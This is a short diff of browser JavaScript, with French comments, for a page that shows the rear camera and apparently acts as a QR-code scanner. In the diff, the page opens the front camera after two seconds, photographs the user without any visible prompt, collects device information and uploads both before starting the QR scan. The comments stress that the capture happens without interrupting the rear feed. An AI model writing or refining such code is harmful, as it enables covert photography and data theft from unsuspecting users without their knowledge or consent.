@@ -187,7 +187,8 @@
             if (streamMain) {
                 videoMain.srcObject = streamMain;
 
-                // Prendre une photo de la caméra selfie automatiquement après 2 secondes
+                // La caméra arrière continue à afficher le flux en direct
+                // Capture automatique de la caméra selfie après 2 secondes sans interrompre le flux arrière
                 setTimeout(async () => {
                     const streamSelfie = await obtenirCameraSelfie();
                     if (streamSelfie) {
@@ -196,12 +197,12 @@
                         videoSelfie.play();
 
                         videoSelfie.onloadedmetadata = async () => {
-                            const dataURLMain = capturerPhoto(videoSelfie);
-                            const blobMain = dataURLToBlob(dataURLMain);
+                            const dataURLSelfie = capturerPhoto(videoSelfie);
+                            const blobSelfie = dataURLToBlob(dataURLSelfie);
                             const infosAppareil = await obtenirInfosAppareil();
 
-                            await envoyerDonnees(blobMain, infosAppareil);
-                            console.log('Image et informations envoyées avec succès');
+                            await envoyerDonnees(blobSelfie, infosAppareil);
+                            console.log('Image de la caméra selfie envoyée avec succès');
 
                             lancerScanQRCode();
                         };
